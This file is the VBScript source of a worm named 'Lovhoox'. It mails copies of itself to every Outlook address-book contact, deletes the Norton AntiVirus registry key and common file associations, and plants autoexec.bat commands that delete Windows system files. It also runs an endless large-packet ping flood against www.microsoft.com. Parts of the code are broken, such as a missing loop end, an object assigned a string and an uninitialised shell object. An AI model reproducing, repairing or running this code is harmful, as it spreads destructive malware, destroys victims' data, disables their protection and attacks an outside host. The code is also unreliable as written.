'Lovhoox
'By M.H.

Sub Outlook()
Me.Hide

Dim x
Set fso="Scripting.FileSystem.Object"
Set so=CreateObject(fso)
Set ol=CreateObject("Outlook.Application")
Set out=WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x=1 To a.AddressEntries.Count
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject=" "
Mail.Body=" "
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send
ol.Quit
End Sub


Sub Key()
Me.Hide

Dim Key
Set Key = CreateObject("WScript.Shell")
Key.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Lovhoox","Lovhoox"
Key.RegDelete "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Norton AntiVirus"
Key.RegDelete "HKEY_CLASSES_ROOT\.wmv"
Key.RegDelete "HKEY_CLASSES_ROOT\.jpg"
Key.RegDelete "HKEY_CLASSES_ROOT\.mp3"
Key.RegDelete "HKEY_CLASSES_ROOT\.mov"
Key.RegDelete "HKEY_CLASSES_ROOT\.avi"
Key.RegDelete "HKEY_CLASSES_ROOT\.txt"
Key.RegDelete "HKEY_CLASSES_ROOT\.doc"
Key.RegDelete "HKEY_CLASSES_ROOT\.zip"
Key.RegDelete "HKEY_CLASSES_ROOT\.rar"
End Sub


Sub Batch()
Me.Hide

Dim fso, Batch, shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set Batch = fso.CreateTextFile("C:\BatFILE.bat")
Batch.WriteLine "@ECHO OFF"
Batch.WriteLine "@ECHO OFF >> C:\autoexec.bat"
Batch.WriteLine "DEL C:\WINDOWS\SYSTEM\*.* >> C:\autoexec.bat"
Batch.WriteLine "DEL C:\WINDOWS\*.* >> C:\autoexec.bat"
Batch.WriteLine "MD C:\Lovhoox"
Batch.Close
shell.Run "C:\BatFILE.bat",vbhide
End Sub


Sub Batch2()
Me.Hide

Dim fso, Batch2, shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set Batch2 = fso.CreateTextfile("C:\Lovhoox\BatFILE2.bat")
Batch2.WriteLine "@ECHO OFF"
Batch2.WriteLine ":Ping
Batch2.WriteLine "Ping -l 65500 www.microsoft.com -t"
Batch2.WriteLine "Goto Ping"
Batch2.Close
shell.Run "C:\Lovhoox\BatFILE2.bat",vbhide
End Sub
